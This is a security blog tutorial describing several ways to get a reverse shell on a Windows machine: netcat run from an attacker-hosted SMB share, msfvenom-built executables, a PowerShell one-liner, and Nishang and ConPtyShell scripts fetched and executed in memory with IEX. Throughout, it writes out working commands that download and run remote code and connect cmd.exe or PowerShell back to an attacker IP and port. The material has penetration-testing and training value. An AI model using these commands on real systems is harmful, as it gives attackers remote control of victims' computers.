---
id: "maneras-de-ejecutar-reverse-shells-en-windows"
title: "Ways to Execute Reverse Shells on Windows"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2022-01-24
updatedDate: 2022-01-24
image: "https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-0.webp"
description: "Learn various techniques for obtaining reverse shells on Windows systems, from netcat to PowerShell scripts to fully interactive ConPtyShell."
categories:
  - windows
draft: false
featured: false
lang: "en"
---

- [Nc.exe](#ncexe)
- [Msfvenom](#msfvenom)
- [Powershell Reverse Shell One-Liner](#powershell-reverse-shell-one-liner)
- [Nishang](#nishang)
- [ConPtyShell](#conptyshell)
- [Checking if Our Process is 32 or 64 Bit](#checking-if-our-process-is-32-or-64-bit)

## Nc.exe

Just like we have netcat in Linux and its respective binaries for that system, there are respective binaries for Windows, both 32-bit (`nc.exe`) and 64-bit (`nc64.exe`), which can be downloaded from the [int0x33/nc.exe repository on GitHub](https://github.com/int0x33/nc.exe/).

In this case, in addition to downloading and executing it, we can execute it directly from a shared resource that we mount ourselves (I mention this as an alternative to downloading an executable).

The `nc.exe` syntax would be as follows:

`nc.exe -e cmd.exe <ip> <port>`

From our Kali, we set up a listener:

![Netcat listener configuration with rlwrap to improve the Windows shell](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-1.avif)

> Note: `rlwrap` is a utility that improves mobility in Windows shells, as these tend to be very limited in terms of mobility (it can also be used in scripts or programs that have or generate an internal interactive shell). Rlwrap allows us to use keyboard shortcuts like Ctrl L, or to retrieve previously used commands using the up arrow key (However, if we do Ctrl C we will lose the shell).
> 
> In conclusion, whenever we set up a listener to receive a Windows shell, it is highly recommended to use `rlwrap`.

Before mounting the SMB server that will share our `nc.exe`, we need to copy the `nc.exe` to our directory or mount the server where the `nc.exe` is located. In my case, by simple preference, I copy the `nc.exe` to my current directory:

![Copying the nc.exe binary to the current directory](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-2.avif)

With this done, we mount the SMB server in our current path using the `smbserver.py` script from impacket, with the following structure:

`smbserver.py <shared resource name> <directory to mount the server> -smb2support`

> Note: the `smb2support` parameter is only necessary if Windows does not support version 1 of SMB.

![SMB server mounted with impacket sharing nc.exe](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-3.avif)

With the SMB server mounted in the location of the `nc.exe` and with the port listening, we simply execute the netcat command I mentioned at the beginning in Windows while indicating that the binary is located in the shared resource named "pwned":

`\\192.168.118.10\pwned\nc.exe -e cmd.exe <ip> <port>`

![Executing nc.exe from SMB shared resource on Windows](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-4.avif)

This way, we can see the access to our SMB server and the shell obtained:

![Reverse shell received from Windows using nc.exe](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-5.avif)

## Msfvenom

Msfvenom is not only useful when we generate shellcodes for Buffer Overflow, it is also useful for creating binaries that execute a shell on Windows. Specifically, the two payloads that may interest us (although there are more and of many types) are the following:

![List of msfvenom payloads for Windows reverse shell](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-6.avif)

In this case, we will use the second one, since my Windows is 64-bit. So we can generate an executable with the following command:

`msfvenom -p <payload> LHOST=<ip> LPORT=<port> -a x<architecture> -f exe -o shell.exe`

> Note: in this command we are not using any encoder, one could be added

![Generating executable payload with msfvenom for Windows x64](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-7.avif)

We transfer this executable to the victim machine and execute it:

![Executing the payload generated with msfvenom on Windows](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-8.avif)

Thus receiving a shell:

![Reverse shell received via msfvenom payload](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-9.avif)

## Powershell Reverse Shell One-Liner

PowerShell is a very powerful language and allows us to do many things, we will see very useful scripts later. But before getting to them, it's good to know that there is a PowerShell statement which establishes a reverse shell and all in a single-line command.

The command in question can be found in the [PowerShell reverse shell one-liner gist by Nikhil SamratAshok Mittal](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3).

Personally, I don't really recommend this method, at least not a direct execution, since, as we can see, it is a command which contains many symbols and many variables, which can make its execution from a webshell or a cmd difficult, the recommended way is to execute it from PowerShell directly.

In any case, you always have to know alternatives and available options. So with that said, we proceed with the execution, which is quite simple, we simply have to change the IP and port of the original command:

![PowerShell reverse shell one-liner with configured IP and port](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-10.avif)

Executing the above command we get a shell without problems:

![Reverse shell received via PowerShell one-liner](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-11.avif)

The only thing to keep in mind is what I said before. I, by preference, almost never use this method.

## Nishang

Nishang is a repository which contains a large number of PowerShell scripts used for offensive security. Its official repository is the [samratashok/nishang repository on GitHub](https://github.com/samratashok/nishang).

Among all the scripts it has, there is one in particular quite famous called [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1), which, of course, invokes a reverse shell with PowerShell.

![Invoke-PowerShellTcp function from the Nishang script](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-12.avif)

As we can see, the script is nothing more than a PowerShell function, so we have two options:

- Download and load the script locally, and then execute the function with the arguments for a reverse shell.
- Load the script remotely and have it, in the same action where it loads, then execute the function with the arguments for the reverse shell, all in one step.

We're going to do it the second way, so we're going to download the script from the official repository:

![Downloading the Invoke-PowerShellTcp.ps1 script with wget](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-13.avif)

![Content of Invoke-PowerShellTcp script showing the function](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-14.avif)

In the script we can see the command to execute to make a reverse shell. So the idea is to copy the command and add it (with our IP and port) at the end of the script:

![Modified Nishang script with function call at the end](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-15.avif)

This way, just when it loads the script in PowerShell which contains the function (cmdlet), it will call the function itself with the arguments for a reverse shell and execute it.

Now, to load the script in PowerShell from a remote source and execute it, we will use the following command:

`IEX(New-Object Net.WebClient).DownloadString(<file hosted on web server>)`

Since it will execute the reverse shell directly, we set up a listener, at the same time we run an HTTP server with Python that hosts the script:

![Listener in listening mode and HTTP server with Python serving the script](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-16.avif)

With this done, we execute the `IEX` command (abbreviation of `Invoke-Expression`) on Windows:

![Executing IEX to load and execute Nishang script remotely](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-17.avif)

This way, we can see the GET request on the server and the shell we obtained:

![HTTP request to server and reverse shell received with Nishang](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-18.avif)

All in one step, moreover, doing everything in memory, since the script is not stored on the Windows hard drive.

## ConPtyShell

ConPtyShell is a tool which allows us to get a fully interactive shell on Windows systems. This means that we can do Ctrl C without danger of losing the shell or we can retrieve previously used commands using the up arrow key. Its official repository can be found at the [antonioCoco/ConPtyShell repository on GitHub](https://github.com/antonioCoco/ConPtyShell).

The process to execute it will practically be the same as with the Nishang script, since this is another PowerShell script.

So we start by downloading the script from the repository:

![Downloading the ConPtyShell script with wget](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-19.avif)

![Content of ConPtyShell script showing the function](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-20.avif)

Just like before, it's just a PowerShell function that we will have to call once we have imported it.

We again have the same options as before, add the command at the end of the script, or execute it after importing the script in PowerShell. This time we will do it the second way.

First of all, in the official repository, we can see how 3 methods are indicated to establish the reverse shell, in my case I will use method 2:

![ConPtyShell usage methods according to official documentation](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-21.avif)

The command with which we will download and import the script we will also change to always have another alternative, in this case, I will use the same one indicated in the repository:

`IEX(IWR -UseBasicParsing <web server where the script is located>)`

This command, we will concatenate it with:

`; Invoke-ConPtyShell -RemoteIp <IP> -RemotePort <port> -Rows <number of rows> -Cols <number of columns>`

This would be the client part (Windows), before doing it, we need to establish the listener on the server side (our machine). To do this, we follow the same steps as indicated in the repository image:

![Listener configuration with stty for ConPtyShell](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-22.avif)

With the first command we are seeing the size of our terminal (`<rows> <columns>`). This information is what we will need to place in the command we will execute from Windows.

Already in listening mode, let's not forget to mount an HTTP server that shares the script:

![HTTP server with Python and listener in listening mode for ConPtyShell](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-23.avif)

With everything ready, we execute the command on Windows:

![Executing IEX command to load ConPtyShell remotely](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-24.avif)

![ConPtyShell connection received in the listener](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-25.avif)

In the received shell, we press enter so we can see the prompt:

![ConPtyShell prompt after pressing Enter](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-26.avif)

Now we just need to do the following:

- `Ctrl Z`
- `stty raw -echo; fg`
- `Enter`

![Executing commands to make the shell fully interactive](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-27.avif)

![Fully interactive Windows shell with ConPtyShell](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-28.avif)

This way, we get a fully interactive shell on Windows.

## Checking if Our Process is 32 or 64 Bit

In privilege escalations on Windows, we have to be very careful about the architecture in which our shell process is working. On a 32-bit system, the only option is that our shell is 32-bit, which is fine.

However, on a 64-bit system, our shell process can be either 32 or 64 bit. What happens is that enumerating and escalating privileges in a 32-bit process when the machine is 64-bit is not optimal, as it can give us many false positives or even prevent us from detecting the way to escalate privileges just because of this detail. This doesn't always happen, we may not have any impediment, but it can happen that we do. A good example is what happens in the article [Passwords - Privilege Escalation on Windows](https://blog.deephacking.tech/en/posts/privilege-escalation-through-passwords-in-windows/#registry).

So it is always highly recommended when the machine is 64-bit, to check if our shell is also 64-bit, or if on the contrary, it is 32-bit. We can check this by reviewing the `%PROCESSOR_ARCHITECTURE%` environment variable. Example:

![Comparison of process architecture between nc64.exe and nc.exe](https://cdn.deephacking.tech/i/posts/maneras-de-ejecutar-reverse-shells-en-windows/maneras-de-ejecutar-reverse-shells-en-windows-29.avif)

Both shells are from the same machine, however, to obtain them, in the upper one I used `nc64.exe` and in the lower one `nc.exe`.

In PowerShell we can also check the process and operating system bits with the commands:

- `[Environment]::Is64BitProcess`
- `[Environment]::Is64BitOperatingSystem`

> Note: in the system, we can find different PowerShell executables. Some 32-bit and others 64-bit. It may be that when we execute `powershell.exe` in relative form, we are calling the 32-bit executable. So, to make sure which PowerShell we are calling, we can use the absolute path, where, as a general rule, it will be as follows:
> 
> - `C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe` (64 bit)
> - `C:\Windows\SysWoW64\WindowsPowerShell\v1.0\powershell.exe` (32 bit)
> - `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` (32 bit)

Taking this last point into account, this way we can ensure that PowerShell is 32 or 64 bit when we call it to execute a command or to send it through netcat:

Example of how it would look when sending a 64-bit PowerShell through netcat:

`nc.exe -e C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe 192.168.118.10 443`

## References

- [nc.exe repository on GitHub](https://github.com/int0x33/nc.exe/)
- [PowerShell reverse shell one-liner by Nikhil SamratAshok Mittal](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3) [@samratashok](https://github.com/samratashok)
- [Nishang repository on GitHub](https://github.com/samratashok/nishang)
- [ConPtyShell repository on GitHub](https://github.com/antonioCoco/ConPtyShell)
- [Why %processor_architecture% always returns x86 instead of AMD64 - Stack Overflow](https://stackoverflow.com/questions/1738985/why-processor-architecture-always-returns-x86-instead-of-amd64)
- [Determine if current PowerShell process is 32-bit or 64-bit - Stack Overflow](https://stackoverflow.com/questions/8588960/determine-if-current-powershell-process-is-32-bit-or-64-bit)
- [How to launch 64-bit PowerShell from 32-bit cmd.exe - Stack Overflow](https://stackoverflow.com/questions/19055924/how-to-launch-64-bit-powershell-from-32-bit-cmd-exe)
